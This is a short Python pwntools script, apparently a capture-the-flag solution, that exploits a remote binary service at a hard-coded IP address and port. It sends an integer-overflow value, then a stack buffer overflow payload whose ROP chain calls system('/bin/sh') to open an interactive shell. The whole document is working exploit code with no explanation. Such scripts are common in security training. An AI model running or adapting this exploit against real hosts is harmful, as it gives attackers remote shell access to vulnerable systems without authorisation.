from pwn import *

# io = process('./pwn')
io = remote('114.67.175.224', 17605)
io.recvuntil(b'Input your int:\n')
io.sendline(b'2147483648')
io.recvuntil(b'Congratulations!\n')
pop_rdi = 0x401343 # ROPgadget --binary ./pwn --only "pop|ret"
call_system = 0x4011F0
bin_sh = 0x403500  # ROPgadget --binary ./pwn --string "/bin/sh"
payload = cyclic(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(call_system)
io.sendline(payload)
io.interactive()
